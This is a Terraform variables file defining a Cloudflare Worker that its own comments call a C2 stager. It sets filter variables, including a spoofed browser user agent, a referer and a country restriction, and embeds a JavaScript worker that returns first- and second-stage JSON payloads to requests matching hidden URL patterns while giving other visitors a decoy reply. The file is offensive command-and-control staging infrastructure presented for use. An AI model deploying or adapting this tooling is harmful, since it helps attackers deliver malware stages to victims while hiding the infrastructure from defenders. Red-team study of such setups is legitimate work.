
variable "first_stage_uri_pattern" {

}
variable "second_stage_uri_pattern" {

}
variable "filter_selection" {
}

variable "worker_name" {
    default = "cf-http-stager"//don't need to change default unless we have more than 1 stager module
}

variable "zone_id" {
}

variable "my_domain_name" {

}

variable "first_stage_json" {

}

variable "second_stage_json" {

}


variable "description" {
    default = "C2-Filter"
}
//Firewall filter definitions
variable "user_agent" {
    default = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
}
variable "referer" {
    default = "NONE"
}
variable "country" {
    default = "US"
}

//our default C2 script - just pass request on to target domain
variable "worker_script_content" {
    default = <<-EOF
addEventListener('fetch', event => {
event.respondWith(handleRequest(event.request))
})
function stage_one_handler(request) {
const init = {
headers: { 'content-type': 'application/json' },
}
//const body = JSON.stringify({ some: 'json' })
const body = JSON.stringify(SOMEJSON1)
return new Response(body, init)
}
function stage_two_handler(request) {
const init = {
headers: { 'content-type': 'application/json' },
}
//const body = JSON.stringify({ some: 'json2' })
const body = JSON.stringify(SOMEJSON2)
return new Response(body, init)
}
async function handleRequest(request) {
let url = new URL(request.url)
if (url.pathname.includes("FIRSTSTAGE")) {
return new stage_one_handler(request)
}
if (request.method === 'POST' && url.pathname.includes("SECONDSTAGE")) {
return new stage_two_handler(request)
}
return new Response( 'Some other time.')
}
EOF
}